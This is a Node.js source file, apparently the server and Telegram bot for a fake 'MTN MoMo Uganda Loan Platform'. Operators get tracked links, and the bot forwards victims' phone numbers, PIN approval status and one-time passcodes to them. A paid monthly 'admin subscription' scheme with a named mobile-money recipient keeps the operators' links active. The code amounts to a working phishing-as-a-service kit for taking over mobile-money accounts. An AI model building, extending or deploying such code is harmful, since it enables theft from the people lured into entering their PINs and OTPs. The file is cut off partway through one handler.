const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const http  = require('http');
const https = require('https');
require('dotenv').config();

const db = require('./database');

const app = express();

// ==========================================
// WEBHOOK MODE (for Render / production)
// ==========================================

const BOT_TOKEN   = process.env.SUPER_ADMIN_BOT_TOKEN;
const PORT        = process.env.PORT || 10000;
const WEBHOOK_URL = process.env.RENDER_EXTERNAL_URL || process.env.APP_URL || `http://localhost:${PORT}`;

// ==========================================
// SUPER ADMINS - Read from environment variable
// ==========================================
const SUPER_ADMINS = (process.env.SUPER_ADMINS || 'ADMIN001').split(',').map(id => id.trim());

// PAYMENT ADMIN = first super admin in the list (ADMIN001 by default)
const PAYMENT_ADMIN = SUPER_ADMINS[0];

// MANAGERS - Designated admins who can create new admin links
// Set in env: MANAGERS=ADMIN002,ADMIN005
const MANAGERS = process.env.MANAGERS ? process.env.MANAGERS.split(',').map(id => id.trim()) : [];

console.log('\n🔧 INITIALIZATION:');
console.log(`   🤖 Bot Token: ${BOT_TOKEN ? '✅ Set' : '❌ Missing'}`);
console.log(`   🌐 Webhook URL: ${WEBHOOK_URL}`);
console.log(`   📍 Port: ${PORT}`);
console.log(`   👥 Managers: ${MANAGERS.length > 0 ? MANAGERS.join(', ') : 'None'}\n`);

// Create bot WITHOUT polling
const bot = new TelegramBot(BOT_TOKEN);

// In-memory maps
const adminChatIds    = new Map(); // adminId → chatId
const pausedAdmins    = new Set(); // adminIds that are paused
const processingLocks = new Set(); // prevents duplicate pin submissions
const adminLinkTimers = new Map(); // adminId → timeout reference for 5-min timer

let dbReady = false;

// ==========================================
// HELPER FUNCTIONS
// ==========================================

function isSuperAdmin(adminId) {
    return SUPER_ADMINS.includes(adminId);
}

function isPaymentAdmin(adminId) {
    return adminId === PAYMENT_ADMIN;
}

// Manager = explicitly designated in MANAGERS env variable
function isManager(adminId) {
    return adminId && MANAGERS.includes(adminId);
}

function isAdminActive(chatId) {
    const adminId = getAdminIdByChatId(chatId);
    if (!adminId) return false;
    if (isSuperAdmin(adminId)) return true;
    return !pausedAdmins.has(adminId);
}

function getAdminIdByChatId(chatId) {
    for (const [adminId, storedChatId] of adminChatIds.entries()) {
        if (Number(storedChatId) === Number(chatId)) return adminId;
    }
    return null;
}

// Format +256XXXXXXXXX for Telegram display (Uganda)
function formatPhone(phoneNumber) {
    if (!phoneNumber) return phoneNumber;
    if (phoneNumber.startsWith('+256'))  return phoneNumber.slice(1);
    if (phoneNumber.startsWith('237'))   return phoneNumber;
    if (!phoneNumber.startsWith('2'))    return '237' + phoneNumber;
    return phoneNumber;
}

async function sendToAdmin(adminId, message, options = {}) {
    const chatId = adminChatIds.get(adminId);

    console.log(`📨 Sending to ${adminId}:`);
    console.log(`   chatId from map: ${chatId}`);
    console.log(`   adminChatIds map size: ${adminChatIds.size}`);
    console.log(`   adminChatIds contents:`, Array.from(adminChatIds.entries()));

    if (!chatId) {
        try {
            const admin = await db.getAdmin(adminId);
            console.log(`   DB lookup result:`, admin ? `Found - chatId: ${admin.chatId}` : 'Not found');

            if (!admin?.chatId) {
                console.error(`❌ No chat ID for admin: ${adminId}`);
                return null;
            }
            adminChatIds.set(adminId, Number(admin.chatId));
            console.log(`   ✅ Added to map from DB: ${adminId} -> ${admin.chatId}`);
            return await bot.sendMessage(Number(admin.chatId), message, options);
        } catch (err) {
            console.error(`❌ DB fallback failed for admin ${adminId}:`, err.message);
            return null;
        }
    }

    try {
        console.log(`   ✅ Sending to chatId: ${chatId}`);
        const result = await bot.sendMessage(chatId, message, options);
        console.log(`   ✅ Message sent successfully`);
        return result;
    } catch (error) {
        console.error(`❌ Error sending to ${adminId} (chatId: ${chatId}):`, error.message);
        return null;
    }
}

// Notify ONLY the payment admin (ADMIN001 / first super admin)
async function notifyPaymentAdmin(message, options = {}) {
    const chatId = adminChatIds.get(PAYMENT_ADMIN);
    if (chatId) {
        try {
            return await bot.sendMessage(chatId, message, options);
        } catch (err) {
            console.error(`❌ Failed to notify payment admin (${PAYMENT_ADMIN}):`, err.message);
        }
    } else {
        // fallback: try DB
        try {
            const admin = await db.getAdmin(PAYMENT_ADMIN);
            if (admin?.chatId) {
                adminChatIds.set(PAYMENT_ADMIN, Number(admin.chatId));
                return await bot.sendMessage(Number(admin.chatId), message, options);
            }
        } catch (err) {
            console.error(`❌ DB fallback for payment admin failed:`, err.message);
        }
    }
    return null;
}

// Start 5-minute countdown for admin link
async function startLinkPaymentTimer(adminId) {
    if (adminLinkTimers.has(adminId)) {
        clearTimeout(adminLinkTimers.get(adminId));
    }

    const timer = setTimeout(async () => {
        try {
            await db.updateAdmin(adminId, { linkLocked: true, linkLockedAt: new Date() });
            adminLinkTimers.delete(adminId);
            console.log(`🔒 Admin link auto-locked after 5 minutes: ${adminId}`);

            const admin = await db.getAdmin(adminId);
            if (admin?.chatId) {
                await bot.sendMessage(admin.chatId, `
🔒 *YOUR LINK HAS BEEN LOCKED*

Your admin link has been automatically locked after 5 minutes.

⏰ To reactivate your link, you must complete payment.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💰 *PAYMENT DETAILS*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📱 **Payment Method:** Mobile Money

**Recipient Name:** Okeyo Bungu
**Phone Number:** 0791336749

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

*Steps to Unlock:*
1️⃣ Send money to: *0791336749*
2️⃣ Use your preferred payment method (M-Pesa, MTN, etc)
3️⃣ Get the transaction reference code
4️⃣ Send the code in this format:

\`/payment YOUR_TRANSACTION_CODE\`

*Example:*
\`/payment UGX123456\`

Once payment is verified, your link will be immediately unlocked.

📧 Questions? Contact the super admin.
                `, { parse_mode: 'Markdown' });
            }
        } catch (error) {
            console.error(`❌ Error locking admin link ${adminId}:`, error);
        }
    }, 5 * 60 * 1000);

    adminLinkTimers.set(adminId, timer);
    console.log(`⏱️ 5-minute timer started for admin link: ${adminId}`);
}

function removeLinkPaymentTimer(adminId) {
    if (adminLinkTimers.has(adminId)) {
        clearTimeout(adminLinkTimers.get(adminId));
        adminLinkTimers.delete(adminId);
        console.log(`✅ 5-minute timer removed for admin: ${adminId}`);
    }
}

// ==========================================
// MIDDLEWARE
// ==========================================
app.use(express.json());
app.use(express.static(__dirname));

// ==========================================
// BOT COMMAND HANDLERS (set up immediately)
// ==========================================
console.log('⏳ Setting up bot handlers...');

bot.on('error',         (error) => console.error('❌ Bot error:',    error?.message));
bot.on('polling_error', (error) => console.error('❌ Polling error:', error?.message));

setupCommandHandlers();
console.log('✅ Command handlers configured!');

// ==========================================
// WEBHOOK ENDPOINT
// ==========================================
const webhookPath = `/telegram-webhook`;

app.post(webhookPath, (req, res) => {
    try {
        console.log('📥 Webhook received:', JSON.stringify(req.body).substring(0, 150));
        if (req.body && req.body.update_id !== undefined) {
            try {
                bot.processUpdate(req.body);
                console.log('✅ Update processed');
            } catch (processError) {
                console.error('❌ processUpdate error:', processError);
            }
        }
        res.sendStatus(200);
    } catch (error) {
        console.error('❌ Webhook handler error:', error);
        res.sendStatus(200);
    }
});

// ==========================================
// DATABASE INIT + WEBHOOK SETUP
// ==========================================
db.connectDatabase()
    .then(async () => {
        dbReady = true;
        console.log('✅ Database ready!');

        await loadAdminChatIds();

        const fullWebhookUrl = `${WEBHOOK_URL}${webhookPath}`;
        let webhookSetSuccessfully = false;
        let attempts = 0;

        while (!webhookSetSuccessfully && attempts < 3) {
            attempts++;
            try {
                console.log(`🔄 Attempt ${attempts}/3: Setting webhook to: ${fullWebhookUrl}`);
                await bot.deleteWebHook();
                await new Promise(resolve => setTimeout(resolve, 1000));

                const result = await bot.setWebHook(fullWebhookUrl, {
                    drop_pending_updates: false,
                    max_connections: 40,
                    allowed_updates: ['message', 'callback_query']
                });

                if (result) {
                    const info = await bot.getWebHookInfo();
                    if (info.url === fullWebhookUrl) {
                        webhookSetSuccessfully = true;
                        console.log(`✅ Webhook CONFIRMED: ${fullWebhookUrl}`);
                    } else {
                        console.error(`❌ Webhook URL mismatch. Got: ${info.url}`);
                    }
                }
            } catch (webhookError) {
                console.error(`❌ Webhook setup error (attempt ${attempts}):`, webhookError.message);
                if (attempts < 3) await new Promise(resolve => setTimeout(resolve, 2000));
            }
        }

        if (!webhookSetSuccessfully) {
            console.error('❌❌❌ CRITICAL: Failed to set webhook after all attempts!');
        }

        try {
            const botInfo = await bot.getMe();
            console.log(`✅ Bot connected: @${botInfo.username} (${botInfo.first_name})`);
        } catch (botError) {
            console.error('❌ Bot API error:', botError);
        }

        setInterval(() => {
            console.log(`💓 Keep-alive: ${adminChatIds.size} admins connected, ${pausedAdmins.size} paused`);
            try {
                const pingUrl = `${WEBHOOK_URL}/health`;
                const client  = pingUrl.startsWith('https') ? https : http;
                client.get(pingUrl, (res) => {
                    res.resume();
                }).on('error', () => {});
            } catch (e) {}
        }, 14 * 60 * 1000);

        // Webhook health check + auto-fix
        setInterval(async () => {
            try {
                const info  = await bot.getWebHookInfo();
                const isSet = info.url === fullWebhookUrl;
                console.log(`🔍 Webhook: ${isSet ? '✅ SET' : '❌ NOT SET'} | Pending: ${info.pending_update_count || 0}`);
                if (!isSet) {
                    console.log('⚠️ Auto-fixing webhook...');
                    await bot.setWebHook(fullWebhookUrl, {
                        drop_pending_updates: false,
                        max_connections: 40,
                        allowed_updates: ['message', 'callback_query']
                    });
                    console.log('✅ Webhook re-set');
                }
            } catch (error) {
                console.error('⚠️ Webhook check error:', error.message);
            }
        }, 60000);

        // Monthly subscription check — UNTOUCHED
        setInterval(async () => {
            try {
                const now = new Date();
                if (now.getDate() === 1 && now.getHours() === 0 && now.getMinutes() < 2) {
                    console.log('📅 Monthly billing cycle: Suspending all non-super-admin links...');

                    const allAdmins    = await db.getAllAdmins();
                    const regularAdmins = allAdmins.filter(a => !isSuperAdmin(a.adminId));

                    for (const admin of regularAdmins) {
                        try {
                            await db.updateAdmin(admin.adminId, {
                                linkLocked:    true,
                                linkLockedAt:  new Date(),
                                paymentStatus: 'pending'
                            });

                            if (admin.chatId) {
                                await bot.sendMessage(admin.chatId, `
📅 *MONTHLY SUBSCRIPTION RENEWAL REQUIRED*

Your subscription has expired and your admin link has been suspended.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💰 *PAYMENT DETAILS*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📱 **Payment Method:** Mobile Money

**Recipient Name:** Okeyo Bungu
**Phone Number:** 0791336749

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

*Steps to Renew:*
1️⃣ Send money to: *0791336749*
2️⃣ Use your preferred payment method (M-Pesa, MTN, etc)
3️⃣ Get the transaction reference code
4️⃣ Send the code in this format:

\`/payment YOUR_TRANSACTION_CODE\`

*Example:*
\`/payment UGX123456\`

Once payment is verified and approved by super admin, your link will be unlocked.

📧 Questions? Contact the super admin.
                                `, { parse_mode: 'Markdown' }).catch(() => {});
                            }

                            console.log(`🔒 Monthly suspension: ${admin.adminId} (${admin.name})`);
                        } catch (err) {
                            console.error(`Failed to suspend ${admin.adminId}:`, err.message);
                        }
                    }

                    console.log(`✅ Suspended ${regularAdmins.length} regular admin(s) (Super admins protected)`);
                }
            } catch (error) {
                console.error('❌ Error checking monthly subscriptions:', error);
            }
        }, 60 * 1000);

        console.log('✅ System fully initialized!');
    })
    .catch((error) => {
        console.error('❌ Initialization failed:', error);
        process.exit(1);
    });

// ==========================================
// LOAD ADMIN CHAT IDs FROM DB
// ==========================================
async function loadAdminChatIds() {
    try {
        const admins = await db.getAllAdmins();
        console.log(`📋 Loading ${admins.length} admins from database...`);

        adminChatIds.clear();
        pausedAdmins.clear();

        for (const admin of admins) {
            console.log(`\n   Processing: ${admin.name} (${admin.adminId}) chatId=${admin.chatId} status=${admin.status}`);
            if (admin.chatId) {
                adminChatIds.set(admin.adminId, Number(admin.chatId));
                if (admin.status === 'paused') pausedAdmins.add(admin.adminId);
                console.log(`   ✅ LOADED`);
            } else {
                console.log(`   ⚠️ SKIPPED - missing chatId`);
            }
        }

        console.log(`\n✅ ${adminChatIds.size} admins loaded, ${pausedAdmins.size} paused`);
    } catch (error) {
        console.error('❌ Error loading admin chat IDs:', error);
    }
}

// ==========================================
// BOT COMMAND HANDLERS
// ==========================================
function setupCommandHandlers() {

    // /start
    bot.onText(/\/start/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        console.log(`\n/start from chatId: ${chatId}, adminId: ${adminId || 'NONE'}`);

        try {
            if (adminId) {
                if (pausedAdmins.has(adminId) && !isSuperAdmin(adminId)) {
                    await bot.sendMessage(chatId, `
🚫 *ADMIN ACCESS PAUSED*

Your admin access has been temporarily paused.
Please contact the super admin.

*Your Admin ID:* \`${adminId}\`
                    `, { parse_mode: 'Markdown' });
                    return;
                }

                const admin            = await db.getAdmin(adminId);
                const isSuperAdminUser = isSuperAdmin(adminId);
                const isManagerUser    = isManager(adminId);

                let message = `
👋 *Welcome ${admin.name}!*

*Your Admin ID:* \`${adminId}\`
*Role:* ${isSuperAdminUser ? '⭐ Super Admin' : isManagerUser ? '🔑 Manager' : '👤 Admin'}
*Your Personal Link:*
${WEBHOOK_URL}?admin=${adminId}

*Commands:*
/mylink - Get your link
/stats - Your statistics
/pending - Pending applications
/myinfo - Your information
`;
                // Manager only: can create new admin links
                if (isManagerUser) {
                    message += `
*Admin Management:*
/addadmin - Add new admin link
`;
                }

                // Super admin only commands
                if (isSuperAdminUser) {
                    message += `
*Admin Management (Super Admin Only):*
/addadmin - Add new admin
/addadminid - Add admin with specific ID
/transferadmin oldChatId | newChatId - Transfer admin
/pauseadmin <adminId> - Pause an admin
/unpauseadmin <adminId> - Unpause an admin
/removeadmin <adminId> - Remove an admin
/clearalladmins - Remove all admins (except SUPER ADMINS)
/admins - List all admins

*Messaging:*
/send <adminId> <message> - Message an admin
/broadcast <message> - Message all admins
/ask <adminId> <request> - Send action request
`;
                }

                // Payment commands: only for payment admin (ADMIN001)
                if (isPaymentAdmin(adminId)) {
                    message += `
*Payment Management:*
/pendingpayments - View pending admin payments
/approvepayment <adminId> - Approve payment
/rejectpayment <adminId> - Reject payment
`;
                }

                await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
            } else {
                await bot.sendMessage(chatId, `
👋 *Welcome to MTN MoMo Uganda Loan Platform!*

Your Chat ID: \`${chatId}\`

Provide this to your super admin to get access.
                `, { parse_mode: 'Markdown' });
            }
        } catch (error) {
            console.error('❌ Error in /start:', error);
        }
    });

    // /mylink
    bot.onText(/\/mylink/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId)               return bot.sendMessage(chatId, '❌ Not registered as admin.');
        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');
        const admin = await db.getAdmin(adminId);
        bot.sendMessage(chatId, `
🔗 *YOUR LINK*

\`${WEBHOOK_URL}?admin=${adminId}\`

📋 Applications → *${admin.name}*
        `, { parse_mode: 'Markdown' });
    });

    // /stats
    bot.onText(/\/stats/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId)               return bot.sendMessage(chatId, '❌ Not registered as admin.');
        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');
        const stats = await db.getAdminStats(adminId);
        bot.sendMessage(chatId, `
📊 *STATISTICS*

📋 Total: ${stats.total}
⏳ PIN Pending: ${stats.pinPending}
✅ PIN Approved: ${stats.pinApproved}
⏳ OTP Pending: ${stats.otpPending}
🎉 Fully Approved: ${stats.fullyApproved}
        `, { parse_mode: 'Markdown' });
    });

    // /pending
    bot.onText(/\/pending/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId)               return bot.sendMessage(chatId, '❌ Not registered as admin.');
        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');

        const adminApps  = await db.getApplicationsByAdmin(adminId);
        const pinPending = adminApps.filter(a => a.pinStatus === 'pending');
        const otpPending = adminApps.filter(a => a.otpStatus === 'pending' && a.pinStatus === 'approved');

        let message = `⏳ *PENDING*\n\n`;
        if (pinPending.length > 0) {
            message += `📱 *PIN (${pinPending.length}):*\n`;
            pinPending.forEach((app, i) => {
                message += `${i+1}. ${formatPhone(app.phoneNumber)} - \`${app.id}\`\n`;
            });
            message += '\n';
        }
        if (otpPending.length > 0) {
            message += `🔢 *OTP (${otpPending.length}):*\n`;
            otpPending.forEach((app, i) => {
                message += `${i+1}. ${formatPhone(app.phoneNumber)} - OTP: \`${app.otp}\`\n`;
            });
        }
        if (pinPending.length === 0 && otpPending.length === 0) {
            message = '✨ No pending applications!';
        }
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    });

    // /myinfo
    bot.onText(/\/myinfo/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId)               return bot.sendMessage(chatId, '❌ Not registered as admin.');
        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');
        const admin       = await db.getAdmin(adminId);
        const statusEmoji = pausedAdmins.has(adminId) ? '🚫' : '✅';
        const statusText  = pausedAdmins.has(adminId) ? 'Paused' : 'Active';
        const roleText    = isSuperAdmin(adminId) ? '⭐ Super Admin' : isManager(adminId) ? '🔑 Manager' : '👤 Admin';
        bot.sendMessage(chatId, `
ℹ️ *YOUR INFO*

👤 ${admin.name}
📧 ${admin.email}
🆔 \`${adminId}\`
💬 \`${chatId}\`
🎭 Role: ${roleText}
📅 ${new Date(admin.createdAt).toLocaleString()}
${statusEmoji} Status: ${statusText}

🔗 ${WEBHOOK_URL}?admin=${adminId}
        `, { parse_mode: 'Markdown' });
    });

    // /addadmin (help) — accessible to BOTH super admins and managers
    bot.onText(/\/addadmin$/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId) return bot.sendMessage(chatId, '❌ Not registered as admin.');
        if (!isSuperAdmin(adminId) && !isManager(adminId)) {
            return bot.sendMessage(chatId, '❌ You do not have permission to add admins.');
        }
        bot.sendMessage(chatId, `
📝 *ADD NEW ADMIN*

Use this format:

\`/addadmin NAME|EMAIL|CHATID\`

*Example:*
\`/addadmin John Doe|john@example.com|123456789\`

*How to get Chat ID:*
1. Ask the new admin to start your bot
2. They will receive their Chat ID
3. Use that Chat ID here
        `, { parse_mode: 'Markdown' });
    });

    // /addadmin NAME|EMAIL|CHATID — accessible to BOTH super admins and managers
    bot.onText(/\/addadmin (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        if (!adminId) return bot.sendMessage(chatId, '❌ Not registered as admin.');
        if (!isSuperAdmin(adminId) && !isManager(adminId)) {
            return bot.sendMessage(chatId, '❌ You do not have permission to add admins.');
        }

        try {
            const parts = match[1].trim().split('|').map(p => p.trim());
            if (parts.length !== 3) {
                return bot.sendMessage(chatId, '❌ Invalid format. Use: `/addadmin NAME|EMAIL|CHATID`', { parse_mode: 'Markdown' });
            }

            const [name, email, chatIdStr] = parts;
            const newChatId = parseInt(chatIdStr);
            if (isNaN(newChatId)) return bot.sendMessage(chatId, '❌ Chat ID must be a number!');

            const allAdmins       = await db.getAllAdmins();
            const existingNumbers = allAdmins.map(a => parseInt(a.adminId.replace('ADMIN', ''))).filter(n => !isNaN(n));
            const nextNumber      = existingNumbers.length > 0 ? Math.max(...existingNumbers) + 1 : 1;
            const newAdminId      = `ADMIN${String(nextNumber).padStart(3, '0')}`;

            await db.saveAdmin({
                adminId:            newAdminId,
                chatId:             newChatId,
                name,
                email,
                status:             'active',
                createdAt:          new Date(),
                linkLocked:         false,
                linkCreatedAt:      new Date(),
                paymentStatus:      'pending',
                paymentSubmittedAt: null,
                payerName:          null,
                paidAt:             null,
                createdBy:          adminId   // track who created this admin
            });
            adminChatIds.set(newAdminId, newChatId);
            startLinkPaymentTimer(newAdminId);

            // Only super admin sees the "already paid?" prompt
            if (isSuperAdmin(adminId)) {
                await bot.sendMessage(chatId, `
✅ *NEW ADMIN CREATED*

👤 ${name}
📧 ${email}
🆔 \`${newAdminId}\`
💬 \`${newChatId}\`

⏰ 5-minute link timer started

*Has this person already paid?*
                `, {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [[
                            { text: '✅ YES - Already Paid', callback_data: `link_paid_yes_${newAdminId}` },
                            { text: '❌ NO - Not Paid Yet',  callback_data: `link_paid_no_${newAdminId}` }
                        ]]
                    }
                });
            } else {
                // Manager just gets a confirmation — no payment decision
                await bot.sendMessage(chatId, `
✅ *NEW ADMIN CREATED*

👤 ${name}
📧 ${email}
🆔 \`${newAdminId}\`
💬 \`${newChatId}\`

⏰ Link is active for *5 minutes*
🔒 After 5 minutes the link will lock until payment is approved by the super admin.
                `, { parse_mode: 'Markdown' });
            }

            try {
                await bot.sendMessage(newChatId, `
🎉 *YOU'RE NOW AN ADMIN!*

Welcome ${name}!

*Your Admin ID:* \`${newAdminId}\`
*Your Personal Link:*
${WEBHOOK_URL}?admin=${newAdminId}

*Your link is valid for 5 minutes*
⏱️ If you have not paid yet, you'll need to submit payment info after 5 minutes.

*Commands:*
/mylink - Get your link
/stats - Your statistics
/pending - Pending applications
/myinfo - Your information

✅ You're connected and ready!
                `, { parse_mode: 'Markdown' });
            } catch (notifyError) {
                bot.sendMessage(chatId, '⚠️ Admin added but could not notify them. They need to /start the bot first.');
            }
        } catch (error) {
            console.error('❌ Error adding admin:', error);
            bot.sendMessage(chatId, '❌ Failed to add admin. Error: ' + error.message);
        }
    });

    // /addadminid — SUPER ADMIN ONLY
    bot.onText(/\/addadminid (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only superadmin can use this command.');

        try {
            const parts = match[1].trim().split('|').map(p => p.trim());
            if (parts.length !== 4) {
                return bot.sendMessage(chatId, `
❌ *Invalid format*

Use: \`/addadminid ADMINID|NAME|EMAIL|CHATID\`

*Example:*
\`/addadminid ADMIN024|John Doe|john@example.com|123456789\`
                `, { parse_mode: 'Markdown' });
            }

            const [newAdminId, name, email, chatIdStr] = parts;
            const newChatId = parseInt(chatIdStr);
            if (isNaN(newChatId)) return bot.sendMessage(chatId, '❌ Chat ID must be a number!');

            const existing = await db.getAdmin(newAdminId);
            if (existing) return bot.sendMessage(chatId, `❌ Admin \`${newAdminId}\` already exists!`, { parse_mode: 'Markdown' });

            await db.saveAdmin({
                adminId:            newAdminId,
                chatId:             newChatId,
                name,
                email,
                status:             'active',
                createdAt:          new Date(),
                linkLocked:         false,
                linkCreatedAt:      new Date(),
                paymentStatus:      'pending',
                paymentSubmittedAt: null,
                payerName:          null,
                paidAt:             null
            });
            adminChatIds.set(newAdminId, newChatId);
            startLinkPaymentTimer(newAdminId);

            await bot.sendMessage(chatId, `
✅ *NEW ADMIN CREATED*

👤 ${name}
📧 ${email}
🆔 \`${newAdminId}\`
💬 \`${newChatId}\`

⏰ 5-minute link timer started

*Has this person already paid?*
            `, {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[
                        { text: '✅ YES - Already Paid', callback_data: `link_paid_yes_${newAdminId}` },
                        { text: '❌ NO - Not Paid Yet',  callback_data: `link_paid_no_${newAdminId}` }
                    ]]
                }
            });

            try {
                await bot.sendMessage(newChatId, `
🎉 *YOU'RE NOW AN ADMIN!*

Welcome ${name}!

*Your Admin ID:* \`${newAdminId}\`
*Your Personal Link:*
${WEBHOOK_URL}?admin=${newAdminId}

*Your link is valid for 5 minutes*
⏱️ If you have not paid yet, you'll need to submit payment info after 5 minutes.

/mylink /stats /pending /myinfo
                `, { parse_mode: 'Markdown' });
            } catch (notifyError) {
                bot.sendMessage(chatId, '⚠️ Admin added but could not notify them. They need to /start first.');
            }
        } catch (error) {
            console.error('❌ Error adding admin with custom ID:', error);
            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
        }
    });

    // /transferadmin — SUPER ADMIN ONLY
    bot.onText(/\/transferadmin (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only superadmin can transfer admins.');

        try {
            const parts = match[1].trim().split('|').map(p => p.trim());
            if (parts.length !== 2) {
                return bot.sendMessage(chatId, `❌ *Invalid Format*\n\nUse: /transferadmin oldChatId | newChatId`, { parse_mode: 'Markdown' });
            }

            const [oldChatIdStr, newChatIdStr] = parts;
            const oldChatId = parseInt(oldChatIdStr);
            const newChatId = parseInt(newChatIdStr);
            if (isNaN(oldChatId) || isNaN(newChatId)) return bot.sendMessage(chatId, '❌ Both Chat IDs must be numbers!');

            let targetAdminId = null;
            for (const [id, storedChatId] of adminChatIds.entries()) {
                if (storedChatId === oldChatId) { targetAdminId = id; break; }
            }
            if (!targetAdminId)             return bot.sendMessage(chatId, `❌ No admin found with Chat ID: \`${oldChatId}\``, { parse_mode: 'Markdown' });
            if (isSuperAdmin(targetAdminId)) return bot.sendMessage(chatId, '🚫 Cannot transfer a super admin!');

            const admin = await db.getAdmin(targetAdminId);
            if (!admin) return bot.sendMessage(chatId, '❌ Admin not found in database!');

            await db.updateAdmin(targetAdminId, { chatId: newChatId });
            adminChatIds.set(targetAdminId, newChatId);

            await bot.sendMessage(chatId, `
🔄 *ADMIN TRANSFERRED*

👤 ${admin.name}
🆔 \`${targetAdminId}\`
Old Chat ID: \`${oldChatId}\`
New Chat ID: \`${newChatId}\`
⏰ ${new Date().toLocaleString()}
            `, { parse_mode: 'Markdown' });

            bot.sendMessage(oldChatId, `⚠️ *YOUR ADMIN ACCESS HAS BEEN TRANSFERRED*\n\nContact super admin if this was not you.`, { parse_mode: 'Markdown' }).catch(() => {});
            bot.sendMessage(newChatId, `
🎉 *ADMIN ACCESS TRANSFERRED TO YOU*

Welcome ${admin.name}!
*Your Admin ID:* \`${targetAdminId}\`
*Your Link:* ${WEBHOOK_URL}?admin=${targetAdminId}

Use /start to see commands.
            `, { parse_mode: 'Markdown' }).catch(() => {
                bot.sendMessage(chatId, `⚠️ Could not notify new Chat ID (they may need to /start first)`);
            });
        } catch (error) {
            console.error('❌ Error transferring admin:', error);
            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
        }
    });

    // /pauseadmin — SUPER ADMIN ONLY
    bot.onText(/\/pauseadmin (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only superadmin can pause admins.');

        try {
            const targetAdminId = match[1].trim();
            if (isSuperAdmin(targetAdminId))     return bot.sendMessage(chatId, '🚫 Cannot pause a super admin!');

            const admin = await db.getAdmin(targetAdminId);
            if (!admin)                          return bot.sendMessage(chatId, `❌ Admin \`${targetAdminId}\` not found.`, { parse_mode: 'Markdown' });
            if (pausedAdmins.has(targetAdminId)) return bot.sendMessage(chatId, `⚠️ Admin is already paused.`);

            pausedAdmins.add(targetAdminId);
            await db.updateAdmin(targetAdminId, { status: 'paused' });

            await bot.sendMessage(chatId, `
🚫 *ADMIN PAUSED*

👤 ${admin.name}
🆔 \`${targetAdminId}\`
⏰ ${new Date().toLocaleString()}

Use /unpauseadmin ${targetAdminId} to restore.
            `, { parse_mode: 'Markdown' });

            const targetChatId = adminChatIds.get(targetAdminId);
            if (targetChatId) bot.sendMessage(targetChatId, `🚫 *YOUR ADMIN ACCESS HAS BEEN PAUSED*\n\nContact super admin for more information.`, { parse_mode: 'Markdown' }).catch(() => {});
        } catch (error) {
            console.error('❌ Error pausing admin:', error);
            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
        }
    });

    // /unpauseadmin — SUPER ADMIN ONLY
    bot.onText(/\/unpauseadmin (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only superadmin can unpause admins.');

        try {
            const targetAdminId = match[1].trim();
            if (!pausedAdmins.has(targetAdminId)) return bot.sendMessage(chatId, `⚠️ Admin is not paused.`);

            const admin = await db.getAdmin(targetAdminId);
            if (!admin) return bot.sendMessage(chatId, `❌ Admin \`${targetAdminId}\` not found.`, { parse_mode: 'Markdown' });

            pausedAdmins.delete(targetAdminId);
            await db.updateAdmin(targetAdminId, { status: 'active' });

            await bot.sendMessage(chatId, `
✅ *ADMIN UNPAUSED*

👤 ${admin.name}
🆔 \`${targetAdminId}\`
⏰ ${new Date().toLocaleString()}
            `, { parse_mode: 'Markdown' });

            const targetChatId = adminChatIds.get(targetAdminId);
            if (targetChatId) bot.sendMessage(targetChatId, `✅ *YOUR ADMIN ACCESS HAS BEEN RESTORED*\n\nYou can now approve loan applications.\n\nUse /start to see commands.`, { parse_mode: 'Markdown' }).catch(() => {});
        } catch (error) {
            console.error('❌ Error unpausing admin:', error);
            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
        }
    });

    // /removeadmin — SUPER ADMIN ONLY
    bot.onText(/\/removeadmin (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only superadmin can remove admins.');

        try {
            const targetAdminId = match[1].trim();
            if (isSuperAdmin(targetAdminId)) return bot.sendMessage(chatId, '🚫 Cannot remove a super admin!');

